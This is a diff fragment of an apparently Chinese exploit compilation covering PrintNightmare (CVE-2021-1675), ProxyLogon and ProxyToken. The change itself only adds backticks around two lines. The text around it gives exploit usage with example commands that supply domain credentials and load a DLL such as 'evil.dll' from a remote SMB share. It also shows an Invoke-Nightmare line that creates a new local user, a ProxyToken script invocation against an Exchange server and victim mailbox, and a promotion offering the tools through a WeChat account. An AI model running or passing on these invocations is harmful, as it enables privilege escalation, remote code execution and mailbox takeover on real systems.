@@ -336,7 +336,7 @@ Invoke-Nightmare -DriverName "PrintTest" -NewUser "FakeZeeker" -NewPassword "123
 
 usage:
 
-CVE-2021-1675.py [-h] [-hashes LMHASH:NTHASH] [-target-ip ip address] [-port [destination port]] target share CVE-2021-1675 implementation. positional arguments:   target                [[domain/]username[:password]@]<targetName or address>   share                 Path to DLL. Example '\\10.10.10.10\share\evil.dll' optional arguments:   -h, --help            show this help message and exit authentication:   -hashes LMHASH:NTHASH                         NTLM hashes, format is LMHASH:NTHASH connection:   -target-ip ip address                         IP Address of the target machine. If omitted it will use whatever was specified as target. This is useful when target is the NetBIOS name                         and you cannot resolve it   -port [destination port]                         Destination port to connect to SMB Server Example; ./CVE-2021-1675.py hackit.local/domain_user:Pass123@192.168.1.10 '\\192.168.1.215\smb\addCube.dll' ./CVE-2021-1675.py hackit.local/domain_user:Pass123@192.168.1.10 'C:\addCube.dll'  
+CVE-2021-1675.py [-h] [-hashes LMHASH:NTHASH] [-target-ip ip address] [-port [destination port]] target share CVE-2021-1675 implementation. positional arguments:   target                `[[domain/]username[:password]@]<targetName or address>`   share                 Path to DLL. Example '\\10.10.10.10\share\evil.dll' optional arguments:   -h, --help            show this help message and exit authentication:   -hashes LMHASH:NTHASH                         NTLM hashes, format is LMHASH:NTHASH connection:   -target-ip ip address                         IP Address of the target machine. If omitted it will use whatever was specified as target. This is useful when target is the NetBIOS name                         and you cannot resolve it   -port [destination port]                         Destination port to connect to SMB Server Example; ./CVE-2021-1675.py hackit.local/domain_user:Pass123@192.168.1.10 '\\192.168.1.215\smb\addCube.dll' ./CVE-2021-1675.py hackit.local/domain_user:Pass123@192.168.1.10 'C:\addCube.dll'  
 
 1.8Exchange ProxyLogon 远程代码执行漏洞 CVE-2021-26855/CVE-2021-27065
 =============================================================
@@ -409,7 +409,7 @@ EXP/POC:
 
 https://github.com/bhdresh/CVE-2021-33766-ProxyToken
 
-./proxytoken.sh -m <Mode> -s <Exchange Server IP>  -t <Target Email Address> -v <Victim Email Address>
+`./proxytoken.sh -m <Mode> -s <Exchange Server IP>  -t <Target Email Address> -v <Victim Email Address>`
 
      本文所有工具已经下载到本地，请关注本公众号并添加微信号：lovesec2022 获取。
 
